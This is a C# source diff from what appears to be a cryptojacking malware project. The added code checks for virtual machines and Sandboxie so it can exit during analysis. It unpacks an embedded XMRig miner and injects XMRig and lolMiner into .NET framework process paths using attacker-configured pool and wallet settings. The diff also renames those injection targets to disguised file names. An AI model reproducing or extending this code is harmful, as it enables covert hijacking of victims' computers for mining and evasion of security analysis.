@@ -3,6 +3,7 @@ using Miner;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO.Compression;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -37,7 +38,28 @@ namespace VolVeR
             {
             }
 
-
+            if (config.antiSandbox == "true")
+            {
+                try
+                {
+                    if (MinerAns.Analysis.DetectVirtualMachine())
+                        Environment.Exit(0);
+                }
+                catch (Exception ex)
+                {
+                }
+            }
+            if (config.antiDebugger == "true")
+            {
+                try
+                {
+                    if (MinerAns.Analysis.DetectSandboxie())
+                        Environment.Exit(0);
+                }
+                catch (Exception ex)
+                {
+                }
+            }
 
 
             if (!MutexControl.CreateMutex())
@@ -71,11 +93,26 @@ namespace VolVeR
             byte[] lolMiner =  Properties.Resources.lolMiner;
 
 
+            var s = new MemoryStream(Properties.Resources.xmrig);
+            using (var archive = new ZipArchive(s))
+            {
+                foreach (var file in archive.Entries)
+                {
+
+
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        file.Open().CopyTo(ms);
+                        xmr = ms.ToArray();
+                    }
+                }
+            }
+
             string args1 = "--algo rx/0 --donate-level 0   --max-cpu-usage " + config.moneroUsage + " -o" + config.moneroPool + " -u " + config.moneroWallet;
             string args2 = "--log off --nocolor --algo ETCHASH --pool " + config.etcPool + " --user " + config.etcWallet + "." + config.etcWorker;
             string args3 = "--log off --nocolor --algo ETHASH --pool " + config.ethPool + " --user " + config.ethWallet + "." + config.ethWorker;
-            string withoutExtension1 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe");
-            string withoutExtension2 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe");
+            string withoutExtension1 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#appdate");
+            string withoutExtension2 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#winappdate");
 
             List<string> stringList = new List<string>();
             stringList.Add("mmc");
@@ -112,7 +149,7 @@ namespace VolVeR
             try
             {
                 if (Process.GetProcessesByName(withoutExtension1).Length == 0)
-                    Program.PE.Run(xmr, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe", args1);
+                    Program.PE.Run(xmr, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#appdate", args1);
 
 
             }
@@ -124,7 +161,7 @@ namespace VolVeR
                 try
                 {
                     if (Process.GetProcessesByName(withoutExtension2).Length == 0)
-                        Program.PE.Run(lolMiner, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe", args2);
+                        Program.PE.Run(lolMiner, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#winappdate", args2);
 
                 }
                 catch { }
@@ -136,7 +173,7 @@ namespace VolVeR
                 {
 
                     if (Process.GetProcessesByName(withoutExtension2).Length == 0)
-                        Program.PE.Run(lolMiner, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe", args3);
+                        Program.PE.Run(lolMiner, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#winappdate", args3);
 
                 }
 
